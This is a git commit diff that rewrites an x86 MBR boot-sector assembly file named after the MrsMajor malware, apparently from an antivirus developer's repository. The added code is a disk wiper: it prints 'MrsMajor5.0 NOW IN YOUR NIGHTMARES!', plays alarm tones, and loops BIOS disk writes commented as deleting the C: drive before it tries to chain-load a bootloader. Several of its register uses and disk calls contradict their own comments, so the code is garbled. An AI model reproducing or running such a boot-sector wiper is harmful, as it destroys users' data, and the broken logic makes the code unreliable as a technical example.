1d8bb65ff628e89ad0ad09f724e7d25bc4557bc7
HydraDragonAntivirus <142328963+HydraDragonAntivirus@users.noreply.github.com>
2024-09-12 11:12:36 +0300

    For ReactOS

--- Assembly/mrsmajor5mbr.asm
+++ Assembly/mrsmajor5mbr.asm
@@ -1,118 +1,188 @@
 BITS 16
-org 0x7c00
+ORG 0x7C00
 
-; Clear the segments
-segments_clear:
-    cli
-    xor ax, ax
-    mov ds, ax
-    mov es, ax
-    mov ss, ax
-    mov sp, 0x7c00
-    mov bp, sp
-    sti
-
-; Set video mode 0x13 (320x200, 256 colors)
 start:
-    mov ax, 0x13
-    int 0x10
+    ; Boot drive is set to the first hard disk
+    mov dl, 0x80            ; Set boot drive to the first hard disk (0x80)
+    
+    ; Play some scary sounds before deletion and message display
+    call scary_sounds
 
-; Load and decompress compressed data from disk
-load_and_decompress:
-    ; Read compressed data from disk (assuming it starts at sector 2)
-    mov ah, 0x02       ; Read sectors from disk
-    mov al, 1          ; Number of sectors to read
-    mov bx, compressed ; ES:BX points to where compressed data is loaded
-    mov dl, 0x00       ; Drive 0 (floppy)
-    mov dh, 0          ; Head 0
-    mov ch, 0          ; Cylinder 0
-    mov cl, 2          ; Sector 2 (where compressed data starts)
-    int 0x13           ; BIOS interrupt to read the disk
+    ; Display message in red
+    mov ah, 0x0E            ; Teletype output function (int 10h)
+    mov bl, 0x0C            ; Set text color to red (0x0C)
+    mov al, 'M'             ; Start writing the message
+    call print_char
+    mov al, 'r'
+    call print_char
+    mov al, 's'
+    call print_char
+    mov al, 'M'
+    call print_char
+    mov al, 'a'
+    call print_char
+    mov al, 'j'
+    call print_char
+    mov al, 'o'
+    call print_char
+    mov al, 'r'
+    call print_char
+    mov al, '5'
+    call print_char
+    mov al, '.'
+    call print_char
+    mov al, '0'
+    call print_char
+    mov al, ' '
+    call print_char
+    mov al, 'N'
+    call print_char
+    mov al, 'O'
+    call print_char
+    mov al, 'W'
+    call print_char
+    mov al, ' '
+    call print_char
+    mov al, 'I'
+    call print_char
+    mov al, 'N'
+    call print_char
+    mov al, ' '
+    call print_char
+    mov al, 'Y'
+    call print_char
+    mov al, 'O'
+    call print_char
+    mov al, 'U'
+    call print_char
+    mov al, 'R'
+    call print_char
+    mov al, ' '
+    call print_char
+    mov al, 'N'
+    call print_char
+    mov al, 'I'
+    call print_char
+    mov al, 'G'
+    call print_char
+    mov al, 'H'
+    call print_char
+    mov al, 'T'
+    call print_char
+    mov al, 'M'
+    call print_char
+    mov al, 'A'
+    call print_char
+    mov al, 'R'
+    call print_char
+    mov al, 'E'
+    call print_char
+    mov al, 'S'
+    call print_char
+    mov al, '!'
+    call print_char
 
-    ; Start decompression of the loaded data
-    xor ax, ax
-    xor bx, bx
-    xor cx, cx
-    xor dx, dx
-    mov si, compressed  ; SI points to compressed data
-    mov di, uncompressed ; DI points to decompressed destination
+    ; Begin deleting the C:\ drive (starting from sector 2)
+    mov cx, 0x02            ; Start at sector 2 (sector 1 is the boot sector)
+    mov dh, 0x00            ; Head 0
+    mov ch, 0x00            ; Cylinder 0
+    mov bx, 0x0000          ; Clear BX for zeroing out memory
 
-decompress_loop:
-    lodsb                ; Load byte into AL from compressed data
+delete_loop:
+    mov ah, 0x03            ; BIOS disk write function (int 13h)
+    xor al, al              ; Set AL to 0 to write 0 bytes (effectively erasing)
+    int 0x13                ; Interrupt call to erase sector
+    jc boot_fail            ; If write fails, show an error message
+    inc cx                  ; Move to the next sector
+    cmp cx, 0xFFFF          ; Continue until we erase many sectors
+    jne delete_loop
 
-    cmp si, uncompressed  ; Check if we are done
-    jae decompression_done
+    ; Chain-load the OS bootloader from the first partition
+    mov dl, 0x80            ; Set the boot drive to the first hard disk
+    mov bx, 0x7E00          ; Load the boot sector of the first partition at 0x7E00
+    mov es, bx
 
-    cmp al, 128          ; Check if it's new data
-    jb old_data
-    ; New data
-    and al, 127          ; Mask high bit
-    mov cl, al           ; Load count into CL
-    jmp new_data_block
+    ; Read the first sector of the active partition (where the bootloader is)
+    mov ah, 0x02            ; BIOS disk read function
+    mov al, 1               ; Read 1 sector
+    mov ch, 0               ; Cylinder 0
+    mov cl, 2               ; Sector 2 (active partition bootloader)
+    mov dh, 0               ; Head 0
+    int 0x13                ; BIOS interrupt to read sector
 
-old_data:
-    ; Old data
-    cmp al, 64
-    jb old_data_case
+    jc boot_fail            ; Jump to failure if disk read fails
 
-    and al, 63
-    mov ah, al           ; Offset length in AH
-    lodsb                ; Load next byte
-    mov cx, ax           ; Set CX to offset length
-    lodsw                ; Load next word
-    mov dx, si           ; Save current SI to DX
-    mov si, di           ; Set SI to destination address
-    sub si, ax           ; Adjust SI by offset length
+    jmp 0x7E00:0x0000       ; Jump to the loaded boot sector (OS bootloader)
 
-old_next_byte:
-    lodsb                ; Load byte into AL
-    stosb                ; Store byte at ES:[DI]
-    loop old_next_byte
-    mov si, dx           ; Restore SI from DX
-    jmp decompress_loop
-
-old_data_case:
-    mov cl, al           ; Load count into CL
-    jmp decompress_loop
-
-new_data_block:
-    ; New data block
-    mov cl, al           ; Count of bytes to copy
-new_next_byte:
-    lodsb                ; Load byte into AL
-    stosb                ; Store byte at ES:[DI]
-    dec cl
-    jnz new_next_byte
-    jmp decompress_loop
-
-decompression_done:
-    ; Decompressed data is now in memory
-    ; Proceed to handle frames and display them
-    call display_frame1
+boot_fail:
+    ; If the bootloader read fails, show an error message
+    mov al, 'B'
+    call print_char
+    mov al, 'o'
+    call print_char
+    mov al, 'o'
+    call print_char
+    mov al, 't'
+    call print_char
+    mov al, ' '
+    call print_char
+    mov al, 'f'
+    call print_char
+    mov al, 'a'
+    call print_char
+    mov al, 'i'
+    call print_char
+    mov al, 'l'
+    call print_char
+    mov al, 'e'
+    call print_char
+    mov al, 'd'
+    call print_char
     jmp $
 
-display_frame1:
-    ; Here you can add code to display the first frame
-    ; Load the first part of uncompressed data (A000:0000)
+scary_sounds:
+    ; Generate low-pitched scary sound
+    mov al, 0xB6            ; Set up the system speaker (control byte for PIT channel 2)
+    out 0x43, al
+    mov ax, 0x0E00          ; Low frequency tone (value in AX determines frequency)
+    out 0x42, al            ; Send low byte to channel 2
+    mov al, ah
+    out 0x42, al            ; Send high byte
+    in al, 0x61             ; Read system speaker control
+    or al, 3                ; Turn on speaker
+    out 0x61, al            ; Activate speaker
+    call delay              ; Delay for a bit to hold the sound
+    and al, 0xFC            ; Turn off speaker
+    out 0x61, al
+
+    ; Generate high-pitched scary sound
+    mov al, 0xB6            ; Set up system speaker again
+    out 0x43, al
+    mov ax, 0x0200          ; High frequency tone
+    out 0x42, al            ; Send low byte to channel 2
+    mov al, ah
+    out 0x42, al            ; Send high byte
+    in al, 0x61             ; Read system speaker control
+    or al, 3                ; Turn on speaker
+    out 0x61, al            ; Activate speaker
+    call delay              ; Delay for a bit
+    and al, 0xFC            ; Turn off speaker
+    out 0x61, al
+
     ret
 
-display_frame2:
-    ; Here you can add code to display the second frame
-    ; Load the second part of uncompressed data (A000:0000)
+delay:
+    ; Simple delay loop for holding sound
+    mov cx, 0xFFFF
+delay_loop:
+    dec cx
+    jnz delay_loop
     ret
 
-; Error handler (optional)
-boot_error:
-    mov ah, 0x0E
-    mov al, 'X'
-    int 0x10
-    jmp stop
+print_char:
+    mov ah, 0x0E           ; Function to print a character
+    int 0x10               ; BIOS interrupt 0x10
+    ret
 
-stop:
-    hlt
-
-times 510 - ($-$$) db 0
-dw 0xaa55
-
-compressed: times 512 - ($-$$) db 0
-uncompressed: times 512 - ($-$$) db 0
+times 510-($-$$) db 0       ; Fill the remaining space up to 510 bytes
+dw 0xAA55                   ; MBR signature (boot indicator)
